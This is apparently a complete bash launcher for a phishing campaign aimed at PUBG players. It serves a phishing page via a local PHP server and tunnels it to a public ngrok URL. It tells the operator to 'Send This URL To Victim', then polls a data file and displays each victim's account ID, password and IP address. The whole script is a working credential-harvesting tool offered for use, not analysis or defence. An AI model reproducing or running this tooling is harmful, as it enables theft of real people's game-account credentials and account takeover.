clear
echo -e "\e[1;35m
 ______  _      _       _      _               
 | ___ \| |    (_)     | |    (_)              
\e[1;34m | |_/ /| |__   _  ___ | |__   _  _ __    __ _ 
\e[1;33m |  __/ | '_ \ | |/ __|| '_ \ | ||  _ \  / _  |
\e[1;32m | |    | | | || |\__ \| | | || || | | || (_| |
 \_|    |_| |_||_||___/|_| |_||_||_| |_| \__, |
                                          __/ |
                                         |___/\e[0m"
echo -e "\e[1;34m Coder :: Yell Phone Naing\e[0m"
echo -e "\e[1;32m Github :: https://www.github.com/T-Tools \e[0m"
echo -e "\e[1;35m Phishing For PUBG Players\e[0m"
echo -e "\e[1;33m Starting Phishing Server\e[0m"
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
sleep 2
echo -e "\e[1;31m Forwarding Local Port To Public  With Ngrok\e[0m"
ngrok http 8080 > /dev/null 2>&1 &
sleep 10
url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
echo -e "\e[1;33m Send This URL To Victim: $url"
while [ true ];do
if [[ -e "data.txt" ]]; then
echo ""
id=$(grep -o 'Account:.*' data.txt | cut -d " " -f2)
pass=$(grep -o 'Pass:.*' data.txt | cut -d " " -f2)
ip=$(grep -o 'Ip:.*' data.txt | cut -d " " -f2)
echo -e "\e[1;35m Someone Is Trying To Enter The Site\e[0m"
echo -e "\e[1;33m $ip\e[0m"
echo -e "\e[1;32m Account Id: $id\e[0m"
echo -e "\e[1;34m Password: $pass\e[0m"
rm data.txt
fi
done